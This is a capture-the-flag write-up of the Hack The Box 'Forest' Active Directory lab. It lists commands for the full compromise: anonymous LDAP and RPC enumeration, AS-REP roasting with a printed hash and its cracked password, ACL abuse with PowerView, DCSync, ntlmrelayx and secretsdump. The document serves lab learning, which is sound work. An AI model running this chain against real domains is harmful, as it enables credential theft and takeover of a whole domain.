# Forest \[Windows AD Easy]

## Report

Enumerate an AD with SMB, DNS, RPC and other services running. FInd a user svc-alfresco whose creds are exposed via NPUsers. Run Bloodhound to find an attack vector. svc-alfresco has permissions to create a user and add him to any group of their desire barring some (eg. Admin).&#x20;

On adding user 'jj' to 'Windows Exchange Permissions' group we can perform a DCSync attack allowing us to replicate all privs as Admin, all attack vectors provided by Bloodhound.

## Cheat Sheet

<pre><code>smbclient -L &#x3C;ip> (anon login) [-U if have username]

Running a DNS server so check it out
nslookup                    
> server 10.10.10.161
> 127.0.0.1
> 10.10.10.161

ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts  [-x simple auth, -s scope]
ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap.anon.out  
ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)'

Windows timestamp to human cus Windows does not follow EPOC, for user and password creation and last pass attempt and all the stuff associated with the above search
ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  
ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  sAMAccountType

ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName sAMAccountType | grep sAMAccountName | awk '{print $2}' > userlist.ldap

Creating wordlist watch

crackmapexec smb --pass-pol 10.10.10.161 (finding the pass policy)
&#x3C;Account lockout threshold - 0 so safely brute>

rpcclient -U '' -N 10.10.10.161 (anonymous login, for further enum)
rpcclient $> enumdomusers  [find an extra user, svc-alfresco]
&#x3C;smbenum and enum4linux also find this so do keep in mind>

tab twice to view all commands
queryusergroups 0x47b [use rid, not username]
querygroup &#x3C;rid group>
queryuser 0x47b

Kerb time
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/&#x3C;user>'
./GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}
hashcat64 -m 18200 &#x3C;hash> rockyou.txt -d1

crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares

evil-winrm login and run SharpHound.exe
Evaluate graph on BloodHound
net user jj Mango123 /add /domain

. .\PowerView.ps1

&#x3C;To become member of 'Exchange Windows Permissions' group> 
$SecPassword = ConvertTo-SecureString 'Mango123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\jj', $SecPassword)
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'jj' <a data-footnote-ref href="#user-content-fn-1">&#x3C;-Credential $Cred></a>
net user jj

&#x3C;For DCSync>
Repeat the first two $ commands again
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jj -Rights DCSync
OR'
sudo python3 ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user jj
#go to 127.0.0.1 to login and script will elevate us to DCSync

sudo ./secretsdump.py -dc-ip 10.10.10.161 htb.local/jj:Mango123@10.10.10.161
</code></pre>

## Proof

SMB - Anonymous shares

DNS - could not leak host name

Check what services run on the port, we know the standard ones

* 464 is used for a domain controller
* 593, RPC over HTTP

`$krb5asrep$23$svc-alfresco@HTB.LOCAL:ab3ff3e24e603b5400fd42db05fdbf7a$6e84491277d80c48f5aaac0b138e20e550b66212eff1f38ccda67722ebd93140f86e4cde32641e96cbb9ddb48598e0db8538b6d1904c9a7b9adc3c5833cd1038d298b26727144fb14864bb349087ee258e4a35eed62a94edab1b3d3e71236dadf3072f2c67c818fe34ce3491a30dc6e4fb766c941672fa81888bc4cfdd79a5a9486c27428ca309bc8f6d77c20d04a00198a4c09e737aadea2115ca42c8997fd21c2da6ddc11a48beb8178ba9bd91755bb1bd0488b8307313046636af8632e774859e31dd9d42053f465ee7a1543fbce275287f7e641037da3cb2e2dff117f2b40ddc7d8ba9fe`

Crack this with hashcat: s3rvice

WinPEAS found: Access denied No AV was detected!!



Why did we run `net user jj Mango123 /add /domain`

Add user to group 'EXCHANGE WINDOWS PERMISSIONS' and once we are in that group, we can get DCSync privs.

<div align="left"><figure><img src="../../.gitbook/assets/image (67).png" alt="" width="563"><figcaption><p>Shortest path from owned principals</p></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (68).png" alt="" width="563"><figcaption><p>ippsec got more info than me, diff version of Sharphound maybe?</p></figcaption></figure></div>

Shortest Path to High Value Targets gives us the graph shown instead of shortest path from owned principle, however it has a lot more info but gives us what we need.

<div align="left"><figure><img src="../../.gitbook/assets/image (55).png" alt="" width="563"><figcaption><p>Shortest Paths to High Value Targets</p></figcaption></figure></div>

> The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.
>
> This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

<div align="left"><figure><img src="../../.gitbook/assets/image (54).png" alt="" width="438"><figcaption></figcaption></figure></div>

> The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL
>
> With write access to the target object's DACL, you can grant yourself any privilege you want on the object.

<div align="left"><figure><img src="../../.gitbook/assets/image (53).png" alt="" width="441"><figcaption></figcaption></figure></div>

## TODO

We did NPU (no pre auth user for kerboros brute),  what does userSPN do? check the kerboros cheatsheet

Group policy password decrypt (Windows Only)

Kerboros golden ticket, last part watch

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption><p>unquoted service path? we can write to that directory</p></figcaption></figure>

[^1]: you only need this if you're not already running as <> process ion remember but we are so no need
